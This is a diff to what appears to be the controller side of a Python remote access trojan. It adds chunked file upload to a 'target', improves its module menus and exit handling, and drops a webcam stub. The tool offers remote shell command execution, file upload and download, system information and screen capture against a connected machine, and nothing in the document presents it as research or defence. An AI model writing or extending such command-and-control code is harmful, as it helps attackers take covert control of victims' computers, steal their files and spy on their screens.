@@ -3,6 +3,7 @@ import struct
 import base64
 import os
 import shlex
+import readline
 import argparse
 
 HOST = "0.0.0.0"
@@ -112,6 +113,8 @@ def send_command(conn: socket.socket, cmd: str):
 
 def do_info(conn: socket.socket):
     cmd = encapsulate(['info'])
+
+    print('\n')
     print(send_command(conn, cmd))
 
 def do_cmd(conn: socket.socket):
@@ -124,6 +127,7 @@ def do_cmd(conn: socket.socket):
                 break
 
             cmd_input = encapsulate(['cmd', 'exec', cmd_input])
+
             print(send_command(conn, cmd_input))
 
         except Exception as e:
@@ -158,9 +162,36 @@ def do_upload(conn: socket.socket, *args):
         print("[-] Usage: upload '<LOCAL_PATH>' '<REMOTE_PATH>'")
         return
 
-    local_path, remote_path = args[0], args[1]
+    local_path = args[0]
+    remote_path = args[1]
 
+    chunk_size = 4096
 
+    try:
+        with open(local_path, 'rb') as f:
+            while True:
+                chunk_data = f.read(chunk_size)
+                if not chunk_data:
+                    status = send_command(conn, encapsulate(['file', 'upload', remote_path, '2']))
+                    if status == '2':
+                        print('[+] Done')
+                        
+                    break
+
+                b64_chunk = base64.b64encode(chunk_data)
+                status = send_command(conn, ['file', 'upload', remote_path, '1', b64_chunk])
+                if status == '0':
+                    print('[-] Remote side failed to write chunk. Aborting upload.')
+                    break
+                elif status == '1':
+                    continue
+
+                else:
+                    print(f'[-] Unknown response from target: {status}')
+                    break
+
+    except Exception as ex:
+        print(f'[-] Upload error: {ex}')
 
 def do_download(conn: socket.socket, *args):
     if len(args) < 2:
@@ -192,6 +223,11 @@ def do_filemgr(conn: socket.socket):
             'help': 'Download file',
             'usage': "download '<REMOTE_PATH>' '<LOCAL_PATH>'",
             'action': do_download
+        },
+        'exit': {
+            'help': 'Exit filemgr',
+            'usage': 'exit',
+            'action': ''
         }
     }
 
@@ -210,8 +246,10 @@ def do_filemgr(conn: socket.socket):
 
             if command == 'help':
                 if len(cmd_args) == 1:
+                    print('\n--- FileMgr Commands ---')
                     for c in dicCmd.keys():
-                        print(f"{c}: {dicCmd[c]['help']}")
+                        print(f"  {c.ljust(10)} : {dicCmd[c]['help']}")
+                    print('-' * 26 + '\n')
                 else:
                     target_cmd = cmd_args[1]
                     if target_cmd not in dicCmd:
@@ -223,6 +261,9 @@ def do_filemgr(conn: socket.socket):
             if command not in dicCmd:
                 print(f'[-] Unknown command: {command}')
                 continue
+
+            if command == 'exit':
+                break
 
             action = dicCmd[command].get('action')
             if action:
@@ -247,33 +288,32 @@ def do_screenshot(conn: socket.socket):
     except Exception as ex:
         print(f'[-] Error: {ex}')
 
-def do_webcam(conn: socket.socket):
-    pass
-
 def do_interactive(conn: socket.socket):
     module = {
-        'info': do_info,
-        'cmd' : do_cmd,
-        'filemgr': do_filemgr,
-        'screenshot': do_screenshot,
-        'exit': '',
+        'info' : (do_info, 'Get target system information'),
+        'cmd' : (do_cmd, 'Execute shell commands'),
+        'filemgr' : (do_filemgr, 'Manage files and directories'),
+        'screenshot' : (do_screenshot, 'Capture target screen'),
+        'exit' : ('', 'Disconnect and exit'),
     }
 
     while True:
-        print('Available module(s):')
-        for i in module.keys():
-            print(f'- {i}')
-    
-        option = input('Enter module: ')
+        print('\n--- Available Modules ---')
+        for name, (_, desc) in module.items():
+            print(f'  {name.ljust(12)} : {desc}')
+        print('-' * 27)
+        
+        option = input('Enter module: ').strip()
         if option not in module.keys():
             print(f'[!] Unknown module: {option}')
             continue
 
         if option == 'exit':
+            send_command(conn, encapsulate(['exit']))
             conn.close()
             break
 
-        module[option](conn)
+        module[option][0](conn)
 
 def main():
 
